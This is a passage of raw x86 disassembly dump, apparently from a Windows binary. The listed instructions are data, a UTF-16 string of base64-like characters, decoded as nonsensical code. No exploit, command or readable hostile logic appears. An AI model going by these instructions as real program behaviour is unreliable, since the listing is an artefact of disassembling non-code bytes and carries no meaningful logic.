  40a19d:	00 76 00             	add    %dh,0x0(%esi)
  40a1a0:	61                   	popa
  40a1a1:	00 6f 00             	add    %ch,0x0(%edi)
  40a1a4:	74 00                	je     0x40a1a6
  40a1a6:	79 00                	jns    0x40a1a8
  40a1a8:	71 00                	jno    0x40a1aa
  40a1aa:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40a1ae:	4d                   	dec    %ebp
  40a1af:	00 65 00             	add    %ah,0x0(%ebp)
  40a1b2:	35 00 33 00 66       	xor    $0x66003300,%eax
  40a1b7:	00 58 00             	add    %bl,0x0(%eax)
  40a1ba:	5a                   	pop    %edx
  40a1bb:	00 7a 00             	add    %bh,0x0(%edx)
  40a1be:	76 00                	jbe    0x40a1c0
  40a1c0:	4f                   	dec    %edi
  40a1c1:	00 53 00             	add    %dl,0x0(%ebx)
  40a1c4:	77 00                	ja     0x40a1c6
  40a1c6:	33 00                	xor    (%eax),%eax
  40a1c8:	6a 00                	push   $0x0
  40a1ca:	77 00                	ja     0x40a1cc
  40a1cc:	48                   	dec    %eax
  40a1cd:	00 6f 00             	add    %ch,0x0(%edi)
  40a1d0:	6d                   	insl   (%dx),%es:(%edi)
  40a1d1:	00 46 00             	add    %al,0x0(%esi)
  40a1d4:	41                   	inc    %ecx
  40a1d5:	00 59 00             	add    %bl,0x0(%ecx)
  40a1d8:	74 00                	je     0x40a1da
  40a1da:	2f                   	das
  40a1db:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40a1df:	00 58 00             	add    %bl,0x0(%eax)
  40a1e2:	62 00                	bound  %eax,(%eax)
  40a1e4:	4f                   	dec    %edi
  40a1e5:	00 57 00             	add    %dl,0x0(%edi)
  40a1e8:	46                   	inc    %esi
  40a1e9:	00 63 00             	add    %ah,0x0(%ebx)
  40a1ec:	79 00                	jns    0x40a1ee
  40a1ee:	58                   	pop    %eax
  40a1ef:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40a1f3:	00 58 00             	add    %bl,0x0(%eax)
  40a1f6:	70 00                	jo     0x40a1f8
  40a1f8:	61                   	popa
  40a1f9:	00 6f 00             	add    %ch,0x0(%edi)
  40a1fc:	41                   	inc    %ecx
  40a1fd:	00 6f 00             	add    %ch,0x0(%edi)
  40a200:	76 00                	jbe    0x40a202
  40a202:	33 00                	xor    (%eax),%eax
  40a204:	42                   	inc    %edx
  40a205:	00 48 00             	add    %cl,0x0(%eax)
  40a208:	4b                   	dec    %ebx
  40a209:	00 6d 00             	add    %ch,0x0(%ebp)
  40a20c:	48                   	dec    %eax
  40a20d:	00 71 00             	add    %dh,0x0(%ecx)
  40a210:	78 00                	js     0x40a212
  40a212:	51                   	push   %ecx
  40a213:	00 69 00             	add    %ch,0x0(%ecx)
  40a216:	69 00 56 00 64 00    	imul   $0x640056,(%eax),%eax
  40a21c:	39 00                	cmp    %eax,(%eax)
  40a21e:	7a 00                	jp     0x40a220
  40a220:	70 00                	jo     0x40a222
  40a222:	4b                   	dec    %ebx
  40a223:	00 35 00 55 00 58    	add    %dh,0x58005500
  40a229:	00 6b 00             	add    %ch,0x0(%ebx)
  40a22c:	55                   	push   %ebp
  40a22d:	00 75 00             	add    %dh,0x0(%ebp)
  40a230:	47                   	inc    %edi
  40a231:	00 2b                	add    %ch,(%ebx)
  40a233:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a236:	75 00                	jne    0x40a238
  40a238:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  40a23c:	58                   	pop    %eax
  40a23d:	00 50 00             	add    %dl,0x0(%eax)
  40a240:	72 00                	jb     0x40a242
  40a242:	4a                   	dec    %edx
  40a243:	00 77 00             	add    %dh,0x0(%edi)
  40a246:	65 00 74 00 43       	add    %dh,%gs:0x43(%eax,%eax,1)
  40a24b:	00 67 00             	add    %ah,0x0(%edi)
  40a24e:	37                   	aaa
  40a24f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a252:	37                   	aaa
  40a253:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  40a257:	00 72 00             	add    %dh,0x0(%edx)
  40a25a:	48                   	dec    %eax
  40a25b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a25e:	2b 00                	sub    (%eax),%eax
  40a260:	57                   	push   %edi
  40a261:	00 36                	add    %dh,(%esi)
  40a263:	00 38                	add    %bh,(%eax)
  40a265:	00 50 00             	add    %dl,0x0(%eax)
  40a268:	6d                   	insl   (%dx),%es:(%edi)
  40a269:	00 73 00             	add    %dh,0x0(%ebx)
  40a26c:	58                   	pop    %eax
  40a26d:	00 70 00             	add    %dh,0x0(%eax)
  40a270:	72 00                	jb     0x40a272
  40a272:	6f                   	outsl  %ds:(%esi),(%dx)
  40a273:	00 6a 00             	add    %ch,0x0(%edx)
  40a276:	79 00                	jns    0x40a278
  40a278:	50                   	push   %eax
  40a279:	00 61 00             	add    %ah,0x0(%ecx)
  40a27c:	67 00 6e 00          	add    %ch,0x0(%bp)
  40a280:	73 00                	jae    0x40a282
  40a282:	75 00                	jne    0x40a284
  40a284:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40a288:	78 00                	js     0x40a28a
  40a28a:	2f                   	das
  40a28b:	00 5a 00             	add    %bl,0x0(%edx)
  40a28e:	37                   	aaa
  40a28f:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40a293:	00 33                	add    %dh,(%ebx)
  40a295:	00 58 00             	add    %bl,0x0(%eax)
  40a298:	6f                   	outsl  %ds:(%esi),(%dx)
  40a299:	00 2f                	add    %ch,(%edi)
  40a29b:	00 42 00             	add    %al,0x0(%edx)
  40a29e:	6d                   	insl   (%dx),%es:(%edi)
  40a29f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a2a2:	48                   	dec    %eax
  40a2a3:	00 44 00 54          	add    %al,0x54(%eax,%eax,1)
  40a2a7:	00 71 00             	add    %dh,0x0(%ecx)
  40a2aa:	73 00                	jae    0x40a2ac
  40a2ac:	7a 00                	jp     0x40a2ae
  40a2ae:	2f                   	das
  40a2af:	00 70 00             	add    %dh,0x0(%eax)
  40a2b2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2b3:	00 5a 00             	add    %bl,0x0(%edx)
  40a2b6:	30 00                	xor    %al,(%eax)
  40a2b8:	5a                   	pop    %edx
  40a2b9:	00 72 00             	add    %dh,0x0(%edx)
  40a2bc:	5a                   	pop    %edx
  40a2bd:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2c0:	4a                   	dec    %edx
  40a2c1:	00 4f 00             	add    %cl,0x0(%edi)
  40a2c4:	77 00                	ja     0x40a2c6
  40a2c6:	6c                   	insb   (%dx),%es:(%edi)
  40a2c7:	00 75 00             	add    %dh,0x0(%ebp)
  40a2ca:	64 00 32             	add    %dh,%fs:(%edx)
  40a2cd:	00 56 00             	add    %dl,0x0(%esi)
  40a2d0:	43                   	inc    %ebx
  40a2d1:	00 2f                	add    %ch,(%edi)
  40a2d3:	00 43 00             	add    %al,0x0(%ebx)
  40a2d6:	69 00 5a 00 56 00    	imul   $0x56005a,(%eax),%eax
  40a2dc:	57                   	push   %edi
  40a2dd:	00 44 00 58          	add    %al,0x58(%eax,%eax,1)
  40a2e1:	00 6a 00             	add    %ch,0x0(%edx)
  40a2e4:	35 00 36 00 6e       	xor    $0x6e003600,%eax
  40a2e9:	00 71 00             	add    %dh,0x0(%ecx)
  40a2ec:	75 00                	jne    0x40a2ee
  40a2ee:	46                   	inc    %esi
  40a2ef:	00 4f 00             	add    %cl,0x0(%edi)
  40a2f2:	53                   	push   %ebx
  40a2f3:	00 78 00             	add    %bh,0x0(%eax)
  40a2f6:	59                   	pop    %ecx
  40a2f7:	00 4f 00             	add    %cl,0x0(%edi)
  40a2fa:	5a                   	pop    %edx
  40a2fb:	00 4a 00             	add    %cl,0x0(%edx)
  40a2fe:	57                   	push   %edi
  40a2ff:	00 48 00             	add    %cl,0x0(%eax)
  40a302:	55                   	push   %ebp
  40a303:	00 38                	add    %bh,(%eax)
  40a305:	00 6f 00             	add    %ch,0x0(%edi)
  40a308:	30 00                	xor    %al,(%eax)
  40a30a:	63 00                	arpl   %eax,(%eax)
  40a30c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a310:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40a314:	35 00 67 00 6c       	xor    $0x6c006700,%eax
  40a319:	00 58 00             	add    %bl,0x0(%eax)
  40a31c:	47                   	inc    %edi
  40a31d:	00 35 00 65 00 71    	add    %dh,0x71006500
  40a323:	00 2f                	add    %ch,(%edi)
  40a325:	00 35 00 51 00 53    	add    %dh,0x53005100
  40a32b:	00 76 00             	add    %dh,0x0(%esi)
  40a32e:	2b 00                	sub    (%eax),%eax
  40a330:	46                   	inc    %esi
  40a331:	00 6f 00             	add    %ch,0x0(%edi)
  40a334:	35 00 68 00 68       	xor    $0x68006800,%eax
  40a339:	00 4f 00             	add    %cl,0x0(%edi)
  40a33c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a33d:	00 4f 00             	add    %cl,0x0(%edi)
  40a340:	39 00                	cmp    %eax,(%eax)
  40a342:	62 00                	bound  %eax,(%eax)
  40a344:	6c                   	insb   (%dx),%es:(%edi)
  40a345:	00 68 00             	add    %ch,0x0(%eax)
  40a348:	78 00                	js     0x40a34a
  40a34a:	58                   	pop    %eax
  40a34b:	00 35 00 38 00 77    	add    %dh,0x77003800
  40a351:	00 39                	add    %bh,(%ecx)
  40a353:	00 6a 00             	add    %ch,0x0(%edx)
  40a356:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40a35a:	50                   	push   %eax
  40a35b:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a35f:	00 75 00             	add    %dh,0x0(%ebp)
  40a362:	6f                   	outsl  %ds:(%esi),(%dx)
  40a363:	00 6e 00             	add    %ch,0x0(%esi)
  40a366:	2f                   	das
  40a367:	00 45 00             	add    %al,0x0(%ebp)
  40a36a:	4b                   	dec    %ebx
  40a36b:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40a36f:	00 50 00             	add    %dl,0x0(%eax)
  40a372:	31 00                	xor    %eax,(%eax)
  40a374:	38 00                	cmp    %al,(%eax)
  40a376:	6a 00                	push   $0x0
  40a378:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40a37c:	6a 00                	push   $0x0
  40a37e:	44                   	inc    %esp
  40a37f:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40a383:	00 52 00             	add    %dl,0x0(%edx)
  40a386:	78 00                	js     0x40a388
  40a388:	71 00                	jno    0x40a38a
  40a38a:	75 00                	jne    0x40a38c
  40a38c:	58                   	pop    %eax
  40a38d:	00 4f 00             	add    %cl,0x0(%edi)
  40a390:	76 00                	jbe    0x40a392
  40a392:	54                   	push   %esp
  40a393:	00 45 00             	add    %al,0x0(%ebp)
  40a396:	76 00                	jbe    0x40a398
  40a398:	71 00                	jno    0x40a39a
  40a39a:	64 00 2f             	add    %ch,%fs:(%edi)
  40a39d:	00 55 00             	add    %dl,0x0(%ebp)
  40a3a0:	42                   	inc    %edx
  40a3a1:	00 6a 00             	add    %ch,0x0(%edx)
  40a3a4:	53                   	push   %ebx
  40a3a5:	00 36                	add    %dh,(%esi)
  40a3a7:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40a3ab:	00 4a 00             	add    %cl,0x0(%edx)
  40a3ae:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3af:	00 36                	add    %dh,(%esi)
  40a3b1:	00 61 00             	add    %ah,0x0(%ecx)
  40a3b4:	52                   	push   %edx
  40a3b5:	00 42 00             	add    %al,0x0(%edx)
  40a3b8:	2f                   	das
  40a3b9:	00 48 00             	add    %cl,0x0(%eax)
  40a3bc:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40a3c0:	47                   	inc    %edi
  40a3c1:	00 45 00             	add    %al,0x0(%ebp)
  40a3c4:	55                   	push   %ebp
  40a3c5:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  40a3c9:	00 70 00             	add    %dh,0x0(%eax)
  40a3cc:	4c                   	dec    %esp
  40a3cd:	00 4d 00             	add    %cl,0x0(%ebp)
  40a3d0:	52                   	push   %edx
  40a3d1:	00 6e 00             	add    %ch,0x0(%esi)
  40a3d4:	51                   	push   %ecx
  40a3d5:	00 4a 00             	add    %cl,0x0(%edx)
  40a3d8:	65 00 4c 00 4b       	add    %cl,%gs:0x4b(%eax,%eax,1)
  40a3dd:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  40a3e1:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40a3e5:	00 4f 00             	add    %cl,0x0(%edi)
  40a3e8:	54                   	push   %esp
  40a3e9:	00 38                	add    %bh,(%eax)
  40a3eb:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  40a3ef:	00 59 00             	add    %bl,0x0(%ecx)
  40a3f2:	4c                   	dec    %esp
  40a3f3:	00 63 00             	add    %ah,0x0(%ebx)
  40a3f6:	52                   	push   %edx
  40a3f7:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40a3fb:	00 59 00             	add    %bl,0x0(%ecx)
  40a3fe:	30 00                	xor    %al,(%eax)
  40a400:	79 00                	jns    0x40a402
  40a402:	79 00                	jns    0x40a404
  40a404:	6a 00                	push   $0x0
  40a406:	43                   	inc    %ebx
  40a407:	00 31                	add    %dh,(%ecx)
  40a409:	00 75 00             	add    %dh,0x0(%ebp)
  40a40c:	52                   	push   %edx
  40a40d:	00 62 00             	add    %ah,0x0(%edx)
  40a410:	69 00 35 00 6c 00    	imul   $0x6c0035,(%eax),%eax
  40a416:	53                   	push   %ebx
  40a417:	00 79 00             	add    %bh,0x0(%ecx)
  40a41a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a41b:	00 59 00             	add    %bl,0x0(%ecx)
  40a41e:	43                   	inc    %ebx
  40a41f:	00 31                	add    %dh,(%ecx)
  40a421:	00 75 00             	add    %dh,0x0(%ebp)
  40a424:	78 00                	js     0x40a426
  40a426:	62 00                	bound  %eax,(%eax)
  40a428:	4a                   	dec    %edx
  40a429:	00 30                	add    %dh,(%eax)
  40a42b:	00 48 00             	add    %cl,0x0(%eax)
  40a42e:	41                   	inc    %ecx
  40a42f:	00 39                	add    %bh,(%ecx)
  40a431:	00 4e 00             	add    %cl,0x0(%esi)
  40a434:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40a438:	6a 00                	push   $0x0
  40a43a:	77 00                	ja     0x40a43c
  40a43c:	57                   	push   %edi
  40a43d:	00 52 00             	add    %dl,0x0(%edx)
  40a440:	73 00                	jae    0x40a442
  40a442:	6f                   	outsl  %ds:(%esi),(%dx)
  40a443:	00 56 00             	add    %dl,0x0(%esi)
  40a446:	69 00 67 00 64 00    	imul   $0x640067,(%eax),%eax
  40a44c:	41                   	inc    %ecx
  40a44d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a450:	33 00                	xor    (%eax),%eax
  40a452:	62 00                	bound  %eax,(%eax)
  40a454:	69 00 51 00 70 00    	imul   $0x700051,(%eax),%eax
  40a45a:	54                   	push   %esp
  40a45b:	00 6f 00             	add    %ch,0x0(%edi)
  40a45e:	75 00                	jne    0x40a460
  40a460:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40a464:	6c                   	insb   (%dx),%es:(%edi)
  40a465:	00 4a 00             	add    %cl,0x0(%edx)
  40a468:	57                   	push   %edi
  40a469:	00 4d 00             	add    %cl,0x0(%ebp)
  40a46c:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40a470:	45                   	inc    %ebp
  40a471:	00 4b 00             	add    %cl,0x0(%ebx)
  40a474:	31 00                	xor    %eax,(%eax)
  40a476:	6e                   	outsb  %ds:(%esi),(%dx)
  40a477:	00 7a 00             	add    %bh,0x0(%edx)
  40a47a:	68 00 39 00 55       	push   $0x55003900
  40a47f:	00 32                	add    %dh,(%edx)
  40a481:	00 58 00             	add    %bl,0x0(%eax)
  40a484:	56                   	push   %esi
  40a485:	00 30                	add    %dh,(%eax)
  40a487:	00 63 00             	add    %ah,0x0(%ebx)
  40a48a:	51                   	push   %ecx
  40a48b:	00 51 00             	add    %dl,0x0(%ecx)
  40a48e:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40a492:	50                   	push   %eax
  40a493:	00 32                	add    %dh,(%edx)
  40a495:	00 50 00             	add    %dl,0x0(%eax)
  40a498:	7a 00                	jp     0x40a49a
  40a49a:	4f                   	dec    %edi
  40a49b:	00 46 00             	add    %al,0x0(%esi)
  40a49e:	7a 00                	jp     0x40a4a0
  40a4a0:	6a 00                	push   $0x0
  40a4a2:	37                   	aaa
  40a4a3:	00 31                	add    %dh,(%ecx)
  40a4a5:	00 35 00 63 00 70    	add    %dh,0x70006300
  40a4ab:	00 75 00             	add    %dh,0x0(%ebp)
  40a4ae:	62 00                	bound  %eax,(%eax)
  40a4b0:	54                   	push   %esp
  40a4b1:	00 71 00             	add    %dh,0x0(%ecx)
  40a4b4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4b5:	00 35 00 36 00 76    	add    %dh,0x76003600
  40a4bb:	00 36                	add    %dh,(%esi)
  40a4bd:	00 76 00             	add    %dh,0x0(%esi)
  40a4c0:	61                   	popa
  40a4c1:	00 43 00             	add    %al,0x0(%ebx)
  40a4c4:	77 00                	ja     0x40a4c6
  40a4c6:	43                   	inc    %ebx
  40a4c7:	00 62 00             	add    %ah,0x0(%edx)
  40a4ca:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40a4ce:	33 00                	xor    (%eax),%eax
  40a4d0:	33 00                	xor    (%eax),%eax
  40a4d2:	4e                   	dec    %esi
  40a4d3:	00 5a 00             	add    %bl,0x0(%edx)
  40a4d6:	35 00 6a 00 4c       	xor    $0x4c006a00,%eax
  40a4db:	00 47 00             	add    %al,0x0(%edi)
  40a4de:	67 00 42 00          	add    %al,0x0(%bp,%si)
  40a4e2:	79 00                	jns    0x40a4e4
  40a4e4:	38 00                	cmp    %al,(%eax)
  40a4e6:	4b                   	dec    %ebx
  40a4e7:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  40a4eb:	00 59 00             	add    %bl,0x0(%ecx)
  40a4ee:	61                   	popa
  40a4ef:	00 76 00             	add    %dh,0x0(%esi)
  40a4f2:	42                   	inc    %edx
  40a4f3:	00 6e 00             	add    %ch,0x0(%esi)
  40a4f6:	77 00                	ja     0x40a4f8
  40a4f8:	72 00                	jb     0x40a4fa
  40a4fa:	44                   	inc    %esp
  40a4fb:	00 36                	add    %dh,(%esi)
  40a4fd:	00 6e 00             	add    %ch,0x0(%esi)
  40a500:	49                   	dec    %ecx
  40a501:	00 38                	add    %bh,(%eax)
  40a503:	00 43 00             	add    %al,0x0(%ebx)
  40a506:	74 00                	je     0x40a508
  40a508:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40a50c:	2b 00                	sub    (%eax),%eax
  40a50e:	7a 00                	jp     0x40a510
  40a510:	58                   	pop    %eax
  40a511:	00 33                	add    %dh,(%ebx)
  40a513:	00 76 00             	add    %dh,0x0(%esi)
  40a516:	44                   	inc    %esp
  40a517:	00 59 00             	add    %bl,0x0(%ecx)
  40a51a:	51                   	push   %ecx
  40a51b:	00 4a 00             	add    %cl,0x0(%edx)
  40a51e:	2b 00                	sub    (%eax),%eax
  40a520:	53                   	push   %ebx
  40a521:	00 36                	add    %dh,(%esi)
  40a523:	00 55 00             	add    %dl,0x0(%ebp)
  40a526:	54                   	push   %esp
  40a527:	00 56 00             	add    %dl,0x0(%esi)
  40a52a:	34 00                	xor    $0x0,%al
  40a52c:	63 00                	arpl   %eax,(%eax)
  40a52e:	4f                   	dec    %edi
  40a52f:	00 48 00             	add    %cl,0x0(%eax)
  40a532:	47                   	inc    %edi
  40a533:	00 49 00             	add    %cl,0x0(%ecx)
  40a536:	51                   	push   %ecx
  40a537:	00 52 00             	add    %dl,0x0(%edx)
  40a53a:	50                   	push   %eax
  40a53b:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  40a53f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a542:	6e                   	outsb  %ds:(%esi),(%dx)
  40a543:	00 47 00             	add    %al,0x0(%edi)
  40a546:	52                   	push   %edx
  40a547:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a54b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a54e:	34 00                	xor    $0x0,%al
  40a550:	75 00                	jne    0x40a552
  40a552:	37                   	aaa
  40a553:	00 53 00             	add    %dl,0x0(%ebx)
  40a556:	53                   	push   %ebx
  40a557:	00 70 00             	add    %dh,0x0(%eax)
  40a55a:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40a55e:	7a 00                	jp     0x40a560
  40a560:	49                   	dec    %ecx
  40a561:	00 57 00             	add    %dl,0x0(%edi)
  40a564:	69 00 4a 00 2b 00    	imul   $0x2b004a,(%eax),%eax
  40a56a:	7a 00                	jp     0x40a56c
  40a56c:	68 00 67 00 76       	push   $0x76006700
  40a571:	00 46 00             	add    %al,0x0(%esi)
  40a574:	45                   	inc    %ebp
  40a575:	00 35 00 55 00 4a    	add    %dh,0x4a005500
  40a57b:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40a57f:	00 66 00             	add    %ah,0x0(%esi)
  40a582:	71 00                	jno    0x40a584
  40a584:	55                   	push   %ebp
  40a585:	00 4b 00             	add    %cl,0x0(%ebx)
  40a588:	59                   	pop    %ecx
  40a589:	00 39                	add    %bh,(%ecx)
  40a58b:	00 46 00             	add    %al,0x0(%esi)
  40a58e:	2b 00                	sub    (%eax),%eax
  40a590:	4c                   	dec    %esp
  40a591:	00 49 00             	add    %cl,0x0(%ecx)
  40a594:	47                   	inc    %edi
  40a595:	00 4a 00             	add    %cl,0x0(%edx)
  40a598:	76 00                	jbe    0x40a59a
  40a59a:	32 00                	xor    (%eax),%al
  40a59c:	57                   	push   %edi
  40a59d:	00 73 00             	add    %dh,0x0(%ebx)
  40a5a0:	61                   	popa
  40a5a1:	00 35 00 31 00 63    	add    %dh,0x63003100
  40a5a7:	00 6e 00             	add    %ch,0x0(%esi)
  40a5aa:	69 00 2b 00 59 00    	imul   $0x59002b,(%eax),%eax
  40a5b0:	49                   	dec    %ecx
  40a5b1:	00 52 00             	add    %dl,0x0(%edx)
  40a5b4:	64 00 45 00          	add    %al,%fs:0x0(%ebp)
  40a5b8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5b9:	00 69 00             	add    %ch,0x0(%ecx)
  40a5bc:	51                   	push   %ecx
  40a5bd:	00 74 00 31          	add    %dh,0x31(%eax,%eax,1)
  40a5c1:	00 56 00             	add    %dl,0x0(%esi)
  40a5c4:	37                   	aaa
  40a5c5:	00 65 00             	add    %ah,0x0(%ebp)
  40a5c8:	43                   	inc    %ebx
  40a5c9:	00 79 00             	add    %bh,0x0(%ecx)
  40a5cc:	2b 00                	sub    (%eax),%eax
  40a5ce:	43                   	inc    %ebx
  40a5cf:	00 51 00             	add    %dl,0x0(%ecx)
  40a5d2:	48                   	dec    %eax
  40a5d3:	00 36                	add    %dh,(%esi)
  40a5d5:	00 70 00             	add    %dh,0x0(%eax)
  40a5d8:	45                   	inc    %ebp
  40a5d9:	00 33                	add    %dh,(%ebx)
  40a5db:	00 65 00             	add    %ah,0x0(%ebp)
  40a5de:	74 00                	je     0x40a5e0
  40a5e0:	42                   	inc    %edx
  40a5e1:	00 4e 00             	add    %cl,0x0(%esi)
  40a5e4:	50                   	push   %eax
  40a5e5:	00 51 00             	add    %dl,0x0(%ecx)
  40a5e8:	57                   	push   %edi
  40a5e9:	00 37                	add    %dh,(%edi)
  40a5eb:	00 35 00 4b 00 6c    	add    %dh,0x6c004b00
  40a5f1:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  40a5f5:	00 73 00             	add    %dh,0x0(%ebx)
  40a5f8:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40a5fb:	00 56 00             	add    %dl,0x0(%esi)
  40a5fe:	56                   	push   %esi
  40a5ff:	00 39                	add    %bh,(%ecx)
  40a601:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40a605:	00 72 00             	add    %dh,0x0(%edx)
  40a608:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40a60c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a60d:	00 72 00             	add    %dh,0x0(%edx)
  40a610:	7a 00                	jp     0x40a612
  40a612:	72 00                	jb     0x40a614
  40a614:	68 00 73 00 75       	push   $0x75007300
  40a619:	00 54 00 4b          	add    %dl,0x4b(%eax,%eax,1)
  40a61d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a620:	30 00                	xor    %al,(%eax)
  40a622:	31 00                	xor    %eax,(%eax)
  40a624:	78 00                	js     0x40a626
  40a626:	4f                   	dec    %edi
  40a627:	00 57 00             	add    %dl,0x0(%edi)
  40a62a:	63 00                	arpl   %eax,(%eax)
  40a62c:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a630:	47                   	inc    %edi
  40a631:	00 50 00             	add    %dl,0x0(%eax)
  40a634:	31 00                	xor    %eax,(%eax)
  40a636:	67 00 43 00          	add    %al,0x0(%bp,%di)
  40a63a:	46                   	inc    %esi
  40a63b:	00 79 00             	add    %bh,0x0(%ecx)
  40a63e:	41                   	inc    %ecx
  40a63f:	00 41 00             	add    %al,0x0(%ecx)
  40a642:	2b 00                	sub    (%eax),%eax
  40a644:	64 00 6c 00 69       	add    %ch,%fs:0x69(%eax,%eax,1)
  40a649:	00 39                	add    %bh,(%ecx)
  40a64b:	00 39                	add    %bh,(%ecx)
  40a64d:	00 6a 00             	add    %ch,0x0(%edx)
  40a650:	4b                   	dec    %ebx
  40a651:	00 4d 00             	add    %cl,0x0(%ebp)
  40a654:	30 00                	xor    %al,(%eax)
  40a656:	43                   	inc    %ebx
  40a657:	00 53 00             	add    %dl,0x0(%ebx)
  40a65a:	52                   	push   %edx
  40a65b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a65e:	52                   	push   %edx
  40a65f:	00 68 00             	add    %ch,0x0(%eax)
  40a662:	51                   	push   %ecx
  40a663:	00 66 00             	add    %ah,0x0(%esi)
  40a666:	34 00                	xor    $0x0,%al
  40a668:	54                   	push   %esp
  40a669:	00 50 00             	add    %dl,0x0(%eax)
  40a66c:	35 00 62 00 7a       	xor    $0x7a006200,%eax
  40a671:	00 4b 00             	add    %cl,0x0(%ebx)
  40a674:	41                   	inc    %ecx
  40a675:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40a679:	00 55 00             	add    %dl,0x0(%ebp)
  40a67c:	31 00                	xor    %eax,(%eax)
  40a67e:	4d                   	dec    %ebp
  40a67f:	00 44 00 36          	add    %al,0x36(%eax,%eax,1)
  40a683:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
  40a687:	00 53 00             	add    %dl,0x0(%ebx)
  40a68a:	46                   	inc    %esi
  40a68b:	00 52 00             	add    %dl,0x0(%edx)
  40a68e:	6d                   	insl   (%dx),%es:(%edi)
  40a68f:	00 35 00 6e 00 7a    	add    %dh,0x7a006e00
  40a695:	00 30                	add    %dh,(%eax)
  40a697:	00 43 00             	add    %al,0x0(%ebx)
  40a69a:	34 00                	xor    $0x0,%al
  40a69c:	39 00                	cmp    %eax,(%eax)
  40a69e:	6c                   	insb   (%dx),%es:(%edi)
  40a69f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a6a2:	45                   	inc    %ebp
  40a6a3:	00 6f 00             	add    %ch,0x0(%edi)
  40a6a6:	5a                   	pop    %edx
  40a6a7:	00 47 00             	add    %al,0x0(%edi)
  40a6aa:	50                   	push   %eax
  40a6ab:	00 46 00             	add    %al,0x0(%esi)
  40a6ae:	33 00                	xor    (%eax),%eax
  40a6b0:	59                   	pop    %ecx
  40a6b1:	00 68 00             	add    %ch,0x0(%eax)
  40a6b4:	50                   	push   %eax
  40a6b5:	00 54 00 49          	add    %dl,0x49(%eax,%eax,1)
  40a6b9:	00 35 00 39 00 50    	add    %dh,0x50003900
  40a6bf:	00 70 00             	add    %dh,0x0(%eax)
  40a6c2:	44                   	inc    %esp
  40a6c3:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40a6c7:	00 5a 00             	add    %bl,0x0(%edx)
  40a6ca:	49                   	dec    %ecx
  40a6cb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a6ce:	78 00                	js     0x40a6d0
  40a6d0:	41                   	inc    %ecx
  40a6d1:	00 50 00             	add    %dl,0x0(%eax)
  40a6d4:	6d                   	insl   (%dx),%es:(%edi)
  40a6d5:	00 57 00             	add    %dl,0x0(%edi)
  40a6d8:	69 00 50 00 61 00    	imul   $0x610050,(%eax),%eax
  40a6de:	76 00                	jbe    0x40a6e0
  40a6e0:	44                   	inc    %esp
  40a6e1:	00 73 00             	add    %dh,0x0(%ebx)
  40a6e4:	79 00                	jns    0x40a6e6
  40a6e6:	42                   	inc    %edx
  40a6e7:	00 70 00             	add    %dh,0x0(%eax)
  40a6ea:	55                   	push   %ebp
  40a6eb:	00 53 00             	add    %dl,0x0(%ebx)
  40a6ee:	74 00                	je     0x40a6f0
  40a6f0:	33 00                	xor    (%eax),%eax
  40a6f2:	58                   	pop    %eax
  40a6f3:	00 67 00             	add    %ah,0x0(%edi)
  40a6f6:	7a 00                	jp     0x40a6f8
  40a6f8:	67 00 56 00          	add    %dl,0x0(%bp)
  40a6fc:	52                   	push   %edx
  40a6fd:	00 4c 00 6f          	add    %cl,0x6f(%eax,%eax,1)
  40a701:	00 61 00             	add    %ah,0x0(%ecx)
  40a704:	43                   	inc    %ebx
